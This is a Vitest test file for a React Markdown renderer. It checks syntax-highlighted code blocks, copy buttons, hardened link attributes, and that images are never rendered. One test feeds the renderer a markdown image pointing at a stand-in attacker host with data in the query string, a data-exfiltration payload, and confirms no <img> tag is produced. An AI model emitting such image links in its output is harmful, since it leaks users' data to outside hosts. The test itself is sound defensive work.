import { renderToStaticMarkup } from "react-dom/server";
import { expect, test } from "vitest";
import { Markdown } from "./markdown";

test("renders markdown with highlighted, copyable code blocks", () => {
  const html = renderToStaticMarkup(
    <Markdown>
      {"Refunds are **final** after 30 days.\n\n```ts\nconst limit = 200;\n```"}
    </Markdown>,
  );
  expect(html).toContain("<strong>final</strong>");
  expect(html).toContain('<span class="hljs-keyword">const</span>');
  expect(html).toContain(">Copy</button>");
});

test("never renders an image, so the browser fetches nothing", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"![secret](https://evil.example/leak?d=abc)"}</Markdown>,
  );
  expect(html).not.toContain("<img");
  expect(html).toContain("secret");
});

test("marks links as noopener noreferrer nofollow", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"[policy](https://example.com/policy)"}</Markdown>,
  );
  expect(html).toContain('rel="noopener noreferrer nofollow"');
});
